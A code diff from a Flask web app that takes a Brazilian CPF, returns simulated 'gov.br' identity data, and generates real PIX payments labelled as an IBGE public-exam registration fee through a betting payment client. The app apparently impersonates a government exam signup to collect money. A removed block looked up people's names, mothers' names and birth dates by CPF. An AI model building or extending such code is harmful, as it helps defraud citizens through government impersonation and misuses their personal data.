@@ -45,7 +45,7 @@ def register_routes(app):
 
     @app.route('/api/validate-cpf', methods=['POST'])
     def validate_cpf():
-        """API para validar CPF usando PayBets API"""
+        """API para validar CPF e simular dados gov.br"""
         try:
             data = request.get_json()
             cpf = data.get('cpf', '').replace('.', '').replace('-', '')
@@ -53,38 +53,17 @@ def register_routes(app):
             if not cpf or len(cpf) != 11:
                 return jsonify({'success': False, 'message': 'CPF inválido'})
             
-            # Usar PayBets API para consultar CPF
-            from paybets_client import paybets_client
-            
-            cpf_result = paybets_client.consult_cpf(cpf)
-            
-            if not cpf_result.get('success'):
-                # Se falhar na API, usar dados de fallback
-                user_data = {
-                    'nome_completo': 'João Silva Santos',
-                    'nome_mae': 'Maria Silva Santos',
-                    'data_nascimento': '15/03/1985',
-                    'cpf': cpf,
-                    'rg': '12.345.678-9',
-                    'naturalidade': 'São Paulo - SP',
-                    'sexo': 'Masculino',
-                    'estado_civil': 'Casado(a)'
-                }
-                print(f"[CPF API] Fallback usado - Erro: {cpf_result.get('message')}")
-            else:
-                # Usar dados da API PayBets
-                api_data = cpf_result.get('data', {})
-                user_data = {
-                    'nome_completo': api_data.get('nome', 'João Silva Santos'),
-                    'nome_mae': api_data.get('nome_mae', 'Maria Silva Santos'),
-                    'data_nascimento': api_data.get('data_nascimento', '15/03/1985'),
-                    'cpf': cpf,
-                    'rg': '12.345.678-9',
-                    'naturalidade': 'São Paulo - SP',
-                    'sexo': 'Masculino' if api_data.get('sexo') == 'M' else 'Feminino',
-                    'estado_civil': 'Casado(a)'
-                }
-                print(f"[CPF API] Dados obtidos da PayBets: {api_data.get('nome')}")
+            # Simular dados do gov.br
+            user_data = {
+                'nome_completo': 'João Silva Santos',
+                'nome_mae': 'Maria Silva Santos',
+                'data_nascimento': '15/03/1985',
+                'cpf': cpf,
+                'rg': '12.345.678-9',
+                'naturalidade': 'São Paulo - SP',
+                'sexo': 'Masculino',
+                'estado_civil': 'Casado(a)'
+            }
             
             session['user_data'] = user_data
             return jsonify({'success': True, 'data': user_data})
@@ -210,38 +189,61 @@ def register_routes(app):
                     print(f"[PIX DEBUG] Campo obrigatório ausente: {field}")
                     return jsonify({'erro': f'Campo {field} é obrigatório'}), 400
 
-            print("[PIX DEBUG] Importando módulos da API PayBets...")
-            from paybets_api import create_production_api, PaymentRequestData, gerar_codigo_pix_simulado
+            print("[PIX DEBUG] Usando PayBetsPixClient simplificado...")
+            from paybets_client import paybets_client
             from datetime import datetime, timedelta
+            import uuid
 
             print("[PIX DEBUG] Preparando dados do pagamento...")
             # Converter valor de centavos para reais para a API PayBets
             valor_reais = data['amount'] / 100 if isinstance(data['amount'], int) else data['amount']
             
-            payment_data = PaymentRequestData(
-                name=data['name'],
-                email=data['email'],
-                cpf=data['cpf'],
-                amount=valor_reais,  # Valor em reais
-                phone=data.get('phone'),
-                description="INSCRICAO CONCURSO PUBLICO IBGE"
-            )
+            # Gerar external_id único
+            timestamp = datetime.now().strftime('%Y%m%d%H%M%S')
+            unique_id = str(uuid.uuid4())[:8]
+            external_id = f"IBGE-{timestamp}-{unique_id}"
 
-            print("[PIX DEBUG] Usando API PayBets otimizada para produção...")
+            print("[PIX DEBUG] Gerando PIX via PayBets...")
             try:
-                with create_production_api() as api:
-                    response = api.create_pix_payment(payment_data)
-                    print(f"[PIX DEBUG] ✓ PIX real gerado com sucesso: {response.transaction_id}")
+                response = paybets_client.generate_pix(
+                    amount=valor_reais,
+                    external_id=external_id,
+                    callback_url="https://webhook.site/unique-id",
+                    name=data['name'],
+                    email=data['email'],
+                    document=data['cpf']
+                )
+                
+                if response.get('success'):
+                    qr_data = response.get('data', {}).get('qrCodeResponse', {})
+                    
+                    print(f"[PIX DEBUG] ✓ PIX real gerado com sucesso: {qr_data.get('transactionId')}")
+                    
+                    # Gerar QR Code em base64
+                    import qrcode
+                    import io
+                    import base64
+                    
+                    qr = qrcode.QRCode(version=1, box_size=10, border=5)
+                    qr.add_data(qr_data.get('qrcode', ''))
+                    qr.make(fit=True)
+                    
+                    img = qr.make_image(fill_color="black", back_color="white")
+                    img_buffer = io.BytesIO()
+                    img.save(img_buffer, format='PNG')
+                    img_str = base64.b64encode(img_buffer.getvalue()).decode()
                     
                     return jsonify({
                         'success': True,
-                        'payment_id': response.transaction_id,
-                        'pix_code': response.pix_code,
-                        'pix_qr_code': response.pix_qr_code,
+                        'payment_id': qr_data.get('transactionId'),
+                        'pix_code': qr_data.get('qrcode'),
+                        'pix_qr_code': f"data:image/png;base64,{img_str}",
                         'expires_at': (datetime.now() + timedelta(minutes=30)).isoformat(),
-                        'status': response.status,
+                        'status': qr_data.get('status', 'PENDING'),
                         'pix_real': True
                     })
+                else:
+                    raise Exception(response.get('message', 'Erro na API PayBets'))
                 
             except Exception as api_error:
                 print(f"[PIX DEBUG] ❌ Erro na API PayBets: {api_error}")
